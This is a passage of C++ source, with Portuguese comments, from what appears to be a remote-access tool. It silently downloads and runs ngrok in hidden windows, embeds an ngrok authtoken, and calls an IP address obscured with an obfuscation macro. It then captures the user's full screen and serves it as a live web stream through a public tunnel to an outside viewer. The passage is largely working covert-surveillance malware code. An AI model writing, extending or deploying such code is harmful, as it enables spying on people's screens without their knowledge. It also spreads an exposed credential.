            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
            !WinHttpReceiveResponse(hRequest, NULL))
        {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Salvar arquivo
        std::ofstream outFile(ngrokZip, std::ios::binary);
        DWORD dwSize = 0;
        DWORD dwDownloaded = 0;
        DWORD totalDownloaded = 0;

        do
        {
            dwSize = 0;
            if (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0)
            {
                char* buffer = new char[dwSize];
                if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded))
                {
                    outFile.write(buffer, dwDownloaded);
                    totalDownloaded += dwDownloaded;

                    // Mostrar progresso a cada 2 MB
                    if (totalDownloaded % (2 * 1024 * 1024) < dwDownloaded)
                    {
                        int mb = totalDownloaded / (1024 * 1024);
                        SendSimpleMessage("📥 Baixando... " + std::to_string(mb) + " MB");
                    }
                }
                delete[] buffer;
            }
        } while (dwSize > 0);

        outFile.close();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        // Extrair ZIP
        SendSimpleMessage("📦 Extraindo arquivos...");
        bool extracted = ExtractNgrok(ngrokZip, std::string(tempPath));
        DeleteFileA(ngrokZip.c_str());

        if (extracted)
        {
            SendSimpleMessage("✅ Extração concluída!");
        }

        return extracted;
    }
    catch (...)
    {
        return false;
    }
}

bool Security::ExtractNgrok(const std::string& zipPath, const std::string& destPath)
{
    try
    {
        // Usar PowerShell para extrair (disponível no Windows por padrão)
        std::string cmd = "powershell -Command \"Expand-Archive -Path '" + zipPath +
            "' -DestinationPath '" + destPath + "' -Force\"";

        STARTUPINFOA si = {};
        PROCESS_INFORMATION pi = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            WaitForSingleObject(pi.hProcess, 30000); // 30 segundos timeout
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return true;
        }
        return false;
    }
    catch (...)
    {
        return false;
    }
}

bool Security::ConfigureNgrokAuthToken()
{
    try
    {
        // COLOQUE SEU AUTHTOKEN AQUI (obtenha em https://dashboard.ngrok.com)
        // Exemplo: ngrokAuthToken = "2aB3cD4eF5gH6iJ7kL8mN9oP0qR1sT2uV3wX4yZ5";

        // Lista de authtokens gratuitos (você pode adicionar vários)
        std::vector<std::string> tokens = {
            "3DNBmI93NAbYDN8v9IHYH7m2bWS_7c3TSsgBmxvpSERQzUVMD",
        };

        // Se não tiver token configurado, tentar usar sem authtoken (pode não funcionar em v3+)
        if (tokens.empty())
        {
            SendSimpleMessage("⚠️ Nenhum authtoken configurado. Tentando sem autenticação...");
            return true; // Continuar mesmo sem token
        }

        // Usar primeiro token disponível
        ngrokAuthToken = tokens[0];

        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string ngrokExe = std::string(tempPath) + "ngrok.exe";

        // Configurar authtoken via comando
        std::string cmd = "\"" + ngrokExe + "\" config add-authtoken " + ngrokAuthToken;

        STARTUPINFOA si = {};
        PROCESS_INFORMATION pi = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            WaitForSingleObject(pi.hProcess, 5000); // 5 segundos timeout
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            SendSimpleMessage("✅ Authtoken configurado automaticamente!");
            return true;
        }

        return false;
    }
    catch (...)
    {
        return false;
    }
}

std::string Security::StartNgrok()
{
    try
    {
        // Baixar ngrok se necessário
        if (!DownloadNgrok())
            return "";

        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string ngrokExe = std::string(tempPath) + "ngrok.exe";

        SendSimpleMessage("🔧 Executando ngrok.exe...");

        // Iniciar ngrok em background (sem authtoken - modo legacy)
        // Ngrok v3 requer authtoken, mas podemos usar http simples
        // Adicionar --host-header para evitar página de aviso
        std::string cmd = "\"" + ngrokExe + "\" http 8080 --log=stdout --log-level=info --host-header=rewrite";

        STARTUPINFOA si = {};
        PROCESS_INFORMATION pi = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        // Criar pipe para capturar saída
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;

        HANDLE hStdOutRead, hStdOutWrite;
        if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0))
        {
            SendSimpleMessage("❌ Erro ao criar pipe para ngrok");
            return "";
        }

        SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

        si.hStdOutput = hStdOutWrite;
        si.hStdError = hStdOutWrite;
        si.dwFlags |= STARTF_USESTDHANDLES;

        if (!CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            CloseHandle(hStdOutRead);
            CloseHandle(hStdOutWrite);
            SendSimpleMessage("❌ Erro ao executar ngrok.exe");
            return "";
        }

        // Salvar PID do ngrok para poder matar apenas este processo depois
        ngrokPID = pi.dwProcessId;

        CloseHandle(hStdOutWrite);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        SendSimpleMessage("⏳ Aguardando ngrok iniciar (5 segundos)...");

        // Ler saída do ngrok para verificar erros
        std::string ngrokOutput = "";
        char buffer[4096];
        DWORD bytesRead;

        // Aguardar e ler saída por 5 segundos
        for (int i = 0; i < 10; i++)
        {
            Sleep(500);

            // Tentar ler saída sem bloquear
            DWORD bytesAvail = 0;
            if (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0)
            {
                if (ReadFile(hStdOutRead, buffer, min(bytesAvail, sizeof(buffer) - 1), &bytesRead, NULL))
                {
                    buffer[bytesRead] = '\0';
                    ngrokOutput += std::string(buffer);

                    // Se encontrar erro de authtoken, tentar reconfigurar
                    if (ngrokOutput.find("ERR_NGROK_108") != std::string::npos ||
                        ngrokOutput.find("authentication failed") != std::string::npos ||
                        ngrokOutput.find("authtoken") != std::string::npos)
                    {
                        CloseHandle(hStdOutRead);
                        SendSimpleMessage("⚠️ Erro de autenticação. Reconfigurando...");

                        // Tentar reconfigurar authtoken
                        if (ConfigureNgrokAuthToken())
                        {
                            SendSimpleMessage("🔄 Tentando novamente...");
                            // Retornar vazio para tentar novamente
                        }
                        else
                        {
                            SendSimpleMessage("❌ Falha na autenticação do ngrok.\n"
                                "**Nota:** Configure um authtoken válido no código fonte.");
                        }
                        return "";
                    }
                }
            }

            // Verificar se ngrok está rodando
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE)
            {
                PROCESSENTRY32 pe32;
                pe32.dwSize = sizeof(PROCESSENTRY32);
                bool ngrokRunning = false;

                if (Process32First(hSnapshot, &pe32))
                {
                    do
                    {
                        std::string processName = ToLower(WideToNarrow(pe32.szExeFile));
                        if (processName == "ngrok.exe")
                        {
                            ngrokRunning = true;
                            break;
                        }
                    } while (Process32Next(hSnapshot, &pe32));
                }
                CloseHandle(hSnapshot);

                if (ngrokRunning && i >= 4) // Pelo menos 2.5 segundos
                {
                    break;
                }
            }
        }

        CloseHandle(hStdOutRead);

        SendSimpleMessage("🔍 Consultando API do ngrok...");

        // Tentar consultar API com retry (até 5 tentativas)
        std::string ngrokResponse = "";
        for (int attempt = 1; attempt <= 5; attempt++)
        {
            if (attempt > 1)
            {
                SendSimpleMessage("🔄 Tentativa " + std::to_string(attempt) + "/5...");
                Sleep(2000); // Aguardar 2 segundos entre tentativas
            }

            // Buscar URL da API local do ngrok
            HINTERNET hSession = WinHttpOpen(L"NgrokAPI/1.0",
                WINHTTP_ACCESS_TYPE_NO_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS, 0);

            if (!hSession) continue;

            HINTERNET hConnect = WinHttpConnect(hSession, AY_OBFUSCATE(L"15.228.83.81"), 4040, 0);
            if (!hConnect)
            {
                WinHttpCloseHandle(hSession);
                continue;
            }

            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
                L"/api/tunnels", NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

            if (!hRequest)
            {
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                continue;
            }

            DWORD timeout = 5000;
            WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
            WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

            if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                WinHttpReceiveResponse(hRequest, NULL))
            {
                // Ler resposta JSON
                DWORD dwSize = 0;
                DWORD dwDownloaded = 0;

                do
                {
                    dwSize = 0;
                    if (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0)
                    {
                        char* buffer = new char[dwSize + 1];
                        ZeroMemory(buffer, dwSize + 1);
                        if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded))
                        {
                            ngrokResponse += std::string(buffer, dwDownloaded);
                        }
                        delete[] buffer;
                    }
                } while (dwSize > 0);

                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);

                // Se recebeu resposta, sair do loop
                if (!ngrokResponse.empty())
                {
                    break;
                }
            }
            else
            {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
            }
        }

        if (ngrokResponse.empty())
        {
            SendSimpleMessage("❌ Ngrok não respondeu após 5 tentativas.\n"
                "**Possíveis causas:**\n"
                "• Firewall bloqueando ngrok\n"
                "• Antivírus bloqueando execução\n"
                "• Porta 4040 já em uso\n\n"
                "**Solução:** Tente novamente ou reinicie o painel.");
            return "";
        }

        SendSimpleMessage("📋 Extraindo URL pública...");

        // Extrair URL pública do JSON (parsing simples)
        size_t pos = ngrokResponse.find("\"public_url\":\"https://");
        if (pos != std::string::npos)
        {
            pos += 14; // Tamanho de "\"public_url\":\""
            size_t end = ngrokResponse.find("\"", pos);
            if (end != std::string::npos)
            {
                return ngrokResponse.substr(pos, end - pos);
            }
        }

        SendSimpleMessage("❌ URL pública não encontrada na resposta do ngrok.\n"
            "**Resposta recebida (primeiros 200 caracteres):**\n"
            "```\n" + ngrokResponse.substr(0, 200) + "...\n```\n\n"
            "**Possível causa:** Ngrok iniciou mas não criou túnel.\n"
            "**Solução:** Tente novamente.");
        return "";
    }
    catch (...)
    {
        SendSimpleMessage("❌ Exceção ao iniciar ngrok");
        return "";
    }
}

void Security::ScreenServerLoop()
{
    // Criar socket IPv6 com dual-stack (aceita IPv4 e IPv6)
    SOCKET serverSock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (serverSock == INVALID_SOCKET)
    {
        // Fallback para IPv4
        serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (serverSock == INVALID_SOCKET) return;

        int opt = 1;
        setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
        sockaddr_in addr4{};
        addr4.sin_family = AF_INET;
        addr4.sin_port = htons(SCREEN_SERVER_PORT);
        addr4.sin_addr.s_addr = INADDR_ANY;
        if (bind(serverSock, (sockaddr*)&addr4, sizeof(addr4)) == SOCKET_ERROR) { closesocket(serverSock); return; }
    }
    else
    {
        // IPv6 dual-stack: aceita tanto ::1 quanto 0.0.0.0
        int opt = 1;
        setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
        int v6only = 0; // 0 = aceitar IPv4 também
        setsockopt(serverSock, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&v6only, sizeof(v6only));

        sockaddr_in6 addr6{};
        addr6.sin6_family = AF_INET6;
        addr6.sin6_port = htons(SCREEN_SERVER_PORT);
        addr6.sin6_addr = in6addr_any;
        if (bind(serverSock, (sockaddr*)&addr6, sizeof(addr6)) == SOCKET_ERROR) { closesocket(serverSock); return; }
    }

    listen(serverSock, 10);
    ConsoleLog("[Screen Server] ✅ Servidor iniciado na porta 8080 (IPv4+IPv6)\n");

    while (screenServerRunning)
    {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(serverSock, &readfds);

        timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        int activity = select(0, &readfds, NULL, NULL, &timeout);
        if (activity <= 0) continue;

        SOCKET clientSock = accept(serverSock, nullptr, nullptr);
        if (clientSock == INVALID_SOCKET) continue;

        // Processar cada conexão em thread separada para não bloquear
        std::thread([this, clientSock]() mutable {
            // Ler requisição até encontrar fim do header HTTP (\r\n\r\n)
            std::string request;
            char buf[1024];
            DWORD recvTimeout = 5000;
            setsockopt(clientSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&recvTimeout, sizeof(recvTimeout));

            while (request.find("\r\n\r\n") == std::string::npos) {
                int bytes = recv(clientSock, buf, sizeof(buf) - 1, 0);
                if (bytes <= 0) break;
                buf[bytes] = '\0';
                request += buf;
                if (request.size() > 16384) break; // limite de segurança
            }

            bool isImageRequest = (request.find("/screenshot") != std::string::npos);
            // Qualquer requisição que não seja imagem serve o HTML
            if (isImageRequest && frameReady)
            {
                // Servir frame do buffer em memoria (capturado pela thread de captura)
                std::vector<char> imageData;
                {
                    std::lock_guard<std::mutex> lock(frameMutex);
                    if (frameReady && !frameBuffer.empty())
                    {
                        imageData = frameBuffer;
                    }
                }

                if (!imageData.empty())
                {
                    std::string header = "HTTP/1.1 200 OK\r\n"
                        "Content-Type: image/jpeg\r\n"
                        "Content-Length: " + std::to_string(imageData.size()) + "\r\n"
                        "Cache-Control: no-cache, no-store, must-revalidate\r\n"
                        "Pragma: no-cache\r\n"
                        "Expires: 0\r\n"
                        "Access-Control-Allow-Origin: *\r\n"
                        "ngrok-skip-browser-warning: true\r\n"
                        "Connection: close\r\n"
                        "\r\n";
                    send(clientSock, header.c_str(), (int)header.size(), 0);
                    send(clientSock, imageData.data(), (int)imageData.size(), 0);
                }
                else
                {
                    std::string response = "HTTP/1.1 503 Service Unavailable\r\n\r\nAguardando primeiro frame...";
                    send(clientSock, response.c_str(), (int)response.size(), 0);
                }
            }
            else
            {
                // Enviar página HTML com streaming em tempo real com controles
                std::string html =
                    "<!DOCTYPE html>\n"
                    "<html>\n"
                    "<head>\n"
                    "    <meta charset='UTF-8'>\n"
                    "    <meta name='viewport' content='width=device-width, initial-scale=1.0'>\n"
                    "    <title>Visualização de Tela - Controles Avançados</title>\n"
                    "    <style>\n"
                    "        * { margin: 0; padding: 0; box-sizing: border-box; }\n"
                    "        body {\n"
                    "            background: #0a0a0a;\n"
                    "            color: #fff;\n"
                    "            font-family: 'Segoe UI', Arial, sans-serif;\n"
                    "            padding: 20px;\n"
                    "            display: flex;\n"
                    "            flex-direction: column;\n"
                    "            align-items: center;\n"
                    "            gap: 15px;\n"
                    "        }\n"
                    "        h1 {\n"
                    "            color: #00ff00;\n"
                    "            text-shadow: 0 0 10px rgba(0,255,0,0.5);\n"
                    "            font-size: 24px;\n"
                    "        }\n"
                    "        #controls {\n"
                    "            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);\n"
                    "            padding: 15px 25px;\n"
                    "            border-radius: 10px;\n"
                    "            border: 1px solid #333;\n"
                    "            display: flex;\n"
                    "            gap: 20px;\n"
                    "            align-items: center;\n"
                    "            flex-wrap: wrap;\n"
                    "            justify-content: center;\n"
                    "        }\n"
                    "        .control-group {\n"
                    "            display: flex;\n"
                    "            align-items: center;\n"
                    "            gap: 10px;\n"
                    "        }\n"
                    "        label {\n"
                    "            font-size: 14px;\n"
                    "            color: #aaa;\n"
                    "        }\n"
                    "        input[type='range'] {\n"
                    "            width: 150px;\n"
                    "            cursor: pointer;\n"
                    "        }\n"
                    "        .fps-value {\n"
                    "            color: #00aaff;\n"
                    "            font-weight: bold;\n"
                    "            min-width: 60px;\n"
                    "        }\n"
                    "        button {\n"
                    "            padding: 8px 16px;\n"
                    "            border: none;\n"
                    "            border-radius: 5px;\n"
                    "            cursor: pointer;\n"
                    "            font-size: 14px;\n"
                    "            font-weight: bold;\n"
                    "            transition: all 0.3s;\n"
                    "        }\n"
                    "        .btn-audio {\n"
                    "            background: #555;\n"
                    "            color: #fff;\n"
                    "        }\n"
                    "        .btn-audio.active {\n"
                    "            background: #00ff00;\n"
                    "            color: #000;\n"
                    "            box-shadow: 0 0 15px rgba(0,255,0,0.5);\n"
                    "        }\n"
                    "        .btn-audio:hover {\n"
                    "            transform: scale(1.05);\n"
                    "        }\n"
                    "        #screenContainer {\n"
                    "            position: relative;\n"
                    "            max-width: 100%;\n"
                    "        }\n"
                    "        #screen {\n"
                    "            max-width: 100%;\n"
                    "            height: auto;\n"
                    "            border: 3px solid #00ff00;\n"
                    "            box-shadow: 0 0 30px rgba(0,255,0,0.4);\n"
                    "            border-radius: 8px;\n"
                    "            cursor: crosshair;\n"
                    "        }\n"
                    "        #cursor {\n"
                    "            position: absolute;\n"
                    "            width: 20px;\n"
                    "            height: 20px;\n"
                    "            pointer-events: none;\n"
                    "            z-index: 1000;\n"
                    "            display: none;\n"
                    "        }\n"
                    "        #status {\n"
                    "            padding: 12px 25px;\n"
                    "            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);\n"
                    "            border-radius: 8px;\n"
                    "            font-size: 14px;\n"
                    "            border: 1px solid #333;\n"
                    "            min-width: 400px;\n"
                    "            text-align: center;\n"
                    "        }\n"
                    "        .online { color: #00ff00; font-weight: bold; }\n"
                    "        .loading { color: #ffaa00; }\n"
                    "        .fps-display { color: #00aaff; margin-left: 15px; }\n"
                    "        .audio-indicator {\n"
                    "            display: inline-block;\n"
                    "            width: 10px;\n"
                    "            height: 10px;\n"
                    "            border-radius: 50%;\n"
                    "            background: #555;\n"
                    "            margin-left: 5px;\n"
                    "        }\n"
                    "        .audio-indicator.active {\n"
                    "            background: #00ff00;\n"
                    "            box-shadow: 0 0 10px rgba(0,255,0,0.8);\n"
                    "            animation: pulse 1s infinite;\n"
                    "        }\n"
                    "        @keyframes pulse {\n"
                    "            0%, 100% { opacity: 1; }\n"
                    "            50% { opacity: 0.5; }\n"
                    "        }\n"
                    "    </style>\n"
                    "</head>\n"
                    "<body>\n"
                    "    <h1>🖥️ Visualização de Tela em Tempo Real</h1>\n"
                    "    \n"
                    "    <div id='controls'>\n"
                    "        <div class='control-group'>\n"
                    "            <label>FPS:</label>\n"
                    "            <input type='range' id='fpsSlider' min='1' max='60' value='60' step='1'>\n"
                    "            <span class='fps-value' id='fpsValue'>60 FPS</span>\n"
                    "        </div>\n"
                    "        <div class='control-group'>\n"
                    "            <button class='btn-audio' id='btnSystemAudio' onclick='toggleSystemAudio()'>&#128266; udio do Sistema<span class='audio-indicator' id='sysAudioInd'></span></button>\n"
                    "            <button class='btn-audio' id='btnMicAudio' onclick='toggleMicAudio()'>&#127908; Microfone<span class='audio-indicator' id='micAudioInd'></span></button>\n"
                    "        </div>\n"
                    "    </div>\n"
                    "    \n"
                    "    <div id='screenContainer'>\n"
                    "        <svg id='cursor' viewBox='0 0 24 24' fill='white' stroke='black' stroke-width='1'>\n"
                    "            <path d='M3 3 L3 18 L8 13 L12 21 L14 20 L10 12 L18 12 Z'/>\n"
                    "        </svg>\n"
                    "        <img id='screen' src='/screenshot.jpg' alt='Carregando...'>\n"
                    "    </div>\n"
                    "    \n"
                    "    <div id='status'>\n"
                    "        <span class='online'>● Conectando...</span>\n"
                    "    </div>\n"
                    "    \n"
                    "    <script>\n"
                    "        const img = document.getElementById('screen');\n"
                    "        const cursor = document.getElementById('cursor');\n"
                    "        const status = document.getElementById('status');\n"
                    "        const fpsSlider = document.getElementById('fpsSlider');\n"
                    "        const fpsValue = document.getElementById('fpsValue');\n"
                    "        \n"
                    "        let targetFps = 60;\n"
                    "        let frameInterval = 1000 / targetFps;\n"
                    "        let lastFrameTime = 0;\n"
                    "        let frameCount = 0;\n"
                    "        let lastFpsUpdate = Date.now();\n"
                    "        let currentFps = 0;\n"
                    "        let isLoading = false;\n"
                    "        let systemAudioEnabled = false;\n"
                    "        let micAudioEnabled = false;\n"
                    "        \n"
                    "        // Controle de FPS\n"
                    "        fpsSlider.addEventListener('input', function() {\n"
                    "            targetFps = parseInt(this.value);\n"
                    "            frameInterval = 1000 / targetFps;\n"
                    "            fpsValue.textContent = targetFps + ' FPS';\n"
                    "        });\n"
                    "        \n"
                    "        // Cursor do mouse\n"
                    "        img.addEventListener('mousemove', function(e) {\n"
                    "            const rect = img.getBoundingClientRect();\n"
                    "            cursor.style.left = (e.clientX - rect.left) + 'px';\n"
                    "            cursor.style.top = (e.clientY - rect.top) + 'px';\n"
                    "            cursor.style.display = 'block';\n"
                    "        });\n"
                    "        \n"
                    "        img.addEventListener('mouseleave', function() {\n"
                    "            cursor.style.display = 'none';\n"
                    "        });\n"
                    "        \n"
                    "        // Áudio do sistema\n"
                    "        function toggleSystemAudio() {\n"
                    "            systemAudioEnabled = !systemAudioEnabled;\n"
                    "            const btn = document.getElementById('btnSystemAudio');\n"
                    "            const ind = document.getElementById('sysAudioInd');\n"
                    "            if (systemAudioEnabled) {\n"
                    "                btn.classList.add('active');\n"
                    "                ind.classList.add('active');\n"
                    "                alert('Audio do sistema nao disponivel.\\nO audio capturado seria do SEU computador, nao da maquina monitorada.\\nPara audio real, use software dedicado como OBS.');\n"
                    "                systemAudioEnabled = false;\n"
                    "                btn.classList.remove('active');\n"
                    "                ind.classList.remove('active');\n"
                    "            }\n"
                    "        }\n"
                    "\n"
                    "\n"
                    "        \n"
                    "        // Microfone\n"
                    "        function toggleMicAudio() {\n"
                    "            micAudioEnabled = !micAudioEnabled;\n"
                    "            const btn = document.getElementById('btnMicAudio');\n"
                    "            const ind = document.getElementById('micAudioInd');\n"
                    "            if (micAudioEnabled) {\n"
                    "                btn.classList.add('active');\n"
                    "                ind.classList.add('active');\n"
                    "                alert('Microfone nao disponivel.\\nCaptura de audio requer implementacao adicional com WebSocket + WASAPI.\\nFuncionalidade em desenvolvimento.');\n"
                    "                micAudioEnabled = false;\n"
                    "                btn.classList.remove('active');\n"
                    "                ind.classList.remove('active');\n"
                    "            }\n"
                    "        }\n"
                    "\n"
                    "\n"
                    "        \n"
                    "        function updateScreen(timestamp) {\n"
                    "            if (!lastFrameTime) lastFrameTime = timestamp;\n"
                    "            const elapsed = timestamp - lastFrameTime;\n"
                    "            \n"
                    "            if (elapsed >= frameInterval && !isLoading) {\n"
                    "                isLoading = true;\n"
                    "                lastFrameTime = timestamp;\n"
                    "                \n"
                    "                fetch('/screenshot.jpg?' + Date.now(), {\n"
                    "                    headers: { 'ngrok-skip-browser-warning': '1' }\n"
                    "                })\n"
                    "                .then(r => r.blob())\n"
                    "                .then(blob => {\n"
                    "                    const url = URL.createObjectURL(blob);\n"
                    "                    const old = img.src;\n"
                    "                    img.src = url;\n"
                    "                    if (old.startsWith('blob:')) URL.revokeObjectURL(old);\n"
                    "                    isLoading = false;\n"
                    "                    frameCount++;\n"
                    "                    const now = Date.now();\n"
                    "                    const fpsElapsed = now - lastFpsUpdate;\n"
                    "                    if (fpsElapsed >= 1000) {\n"
                    "                        currentFps = Math.round((frameCount * 1000) / fpsElapsed);\n"
                    "                        frameCount = 0;\n"
                    "                        lastFpsUpdate = now;\n"
                    "                    }\n"
                    "                    status.innerHTML = '<span class=\"online\">● Ao Vivo</span> | ' +\n"
                    "                        new Date().toLocaleTimeString() +\n"
                    "                        '<span class=\"fps-display\">| ' + currentFps + ' FPS (alvo: ' + targetFps + ')</span>';\n"
                    "                })\n"
                    "                .catch(() => {\n"
                    "                    isLoading = false;\n"
                    "                    status.innerHTML = '<span class=\"loading\">⚠ Reconectando...</span>';\n"
                    "                });\n"
                    "            }\n"
                    "            \n"
                    "            requestAnimationFrame(updateScreen);\n"
                    "        }\n"
                    "        \n"
                    "        // Iniciar\n"
                    "        setTimeout(() => {\n"
                    "            requestAnimationFrame(updateScreen);\n"
                    "        }, 100);\n"
                    "    </script>\n"
                    "</body>\n"
                    "</html>";

                std::string response = "HTTP/1.1 200 OK\r\n"
                    "Content-Type: text/html; charset=utf-8\r\n"
                    "Content-Length: " + std::to_string(html.size()) + "\r\n"
                    "Cache-Control: no-cache\r\n"
                    "ngrok-skip-browser-warning: true\r\n"
                    "Access-Control-Allow-Origin: *\r\n"
                    "Connection: close\r\n"
                    "\r\n" + html;

                send(clientSock, response.c_str(), (int)response.size(), 0);
            }

            closesocket(clientSock);
            }).detach();
    }

    closesocket(serverSock);
    ConsoleLog("[Screen Server] Servidor encerrado\n");
}

void Security::ScreenCaptureLoop()
{
    ConsoleLog("[Capture] Thread de captura iniciada\n");

    // Inicializar GDI+ uma vez para toda a thread
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok)
    {
        ConsoleLog("[Capture] ERRO: GdiplusStartup falhou\n");
        return;
    }

    // Encontrar encoder JPEG uma vez
    CLSID jpegClsid;
    bool foundEncoder = false;
    UINT numEncoders = 0, encSize = 0;
    GetImageEncodersSize(&numEncoders, &encSize);
    if (encSize > 0)
    {
        ImageCodecInfo* pInfo = (ImageCodecInfo*)malloc(encSize);
        if (pInfo)
        {
            GetImageEncoders(numEncoders, encSize, pInfo);
            for (UINT j = 0; j < numEncoders; j++)
            {
                if (wcscmp(pInfo[j].MimeType, L"image/jpeg") == 0)
                {
                    jpegClsid = pInfo[j].Clsid;
                    foundEncoder = true;
                    break;
                }
            }
            free(pInfo);
        }
    }

    if (!foundEncoder)
    {
        ConsoleLog("[Capture] ERRO: Encoder JPEG nao encontrado\n");
        GdiplusShutdown(gdiplusToken);
        return;
    }

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int targetW = 1920, targetH = 1080;
    float scaleX = (float)targetW / screenWidth;
    float scaleY = (float)targetH / screenHeight;
    float scale = (scaleX < scaleY) ? scaleX : scaleY;
    int finalW = (int)(screenWidth * scale);
    int finalH = (int)(screenHeight * scale);

    char buf[128];
    sprintf_s(buf, "[Capture] Resolucao: %dx%d -> %dx%d\n", screenWidth, screenHeight, finalW, finalH);
    ConsoleLog(buf);

    // Configurar qualidade JPEG
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 80; // 80% - alta qualidade
    encoderParams.Parameter[0].Value = &quality;

    int frameCount = 0;
    auto lastFpsLog = std::chrono::steady_clock::now();

    while (screenServerRunning)
    {
        auto frameStart = std::chrono::steady_clock::now();

        // Capturar tela
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
        HGDIOBJ old = SelectObject(hdcMem, hBitmap);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

        // Cursor
        CURSORINFO ci; ci.cbSize = sizeof(CURSORINFO);
        if (GetCursorInfo(&ci) && ci.flags == CURSOR_SHOWING)
        {
            ICONINFO ii;
            if (GetIconInfo(ci.hCursor, &ii))
            {
                DrawIconEx(hdcMem, ci.ptScreenPos.x - ii.xHotspot, ci.ptScreenPos.y - ii.yHotspot, ci.hCursor, 0, 0, 0, NULL, DI_NORMAL);
                DeleteObject(ii.hbmMask);
                if (ii.hbmColor) DeleteObject(ii.hbmColor);
            }
        }
        SelectObject(hdcMem, old);

        // Criar bitmap GDI+ e redimensionar
        Bitmap* bmpFull = Bitmap::FromHBITMAP(hBitmap, NULL);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);

        if (bmpFull && bmpFull->GetLastStatus() == Ok)
        {
            Bitmap* bmpResized = new Bitmap(finalW, finalH, PixelFormat24bppRGB);
            Graphics* g = Graphics::FromImage(bmpResized);
            g->SetInterpolationMode(InterpolationModeLowQuality);
            g->SetSmoothingMode(SmoothingModeNone);
            g->SetCompositingQuality(CompositingQualityHighSpeed);
            g->DrawImage(bmpFull, 0, 0, finalW, finalH);
            delete g;
            delete bmpFull;

            // Salvar JPEG em stream de memoria
            IStream* pStream = NULL;
            if (SUCCEEDED(CreateStreamOnHGlobal(NULL, TRUE, &pStream)))
            {
                if (bmpResized->Save(pStream, &jpegClsid, &encoderParams) == Ok)
                {
                    STATSTG stat;
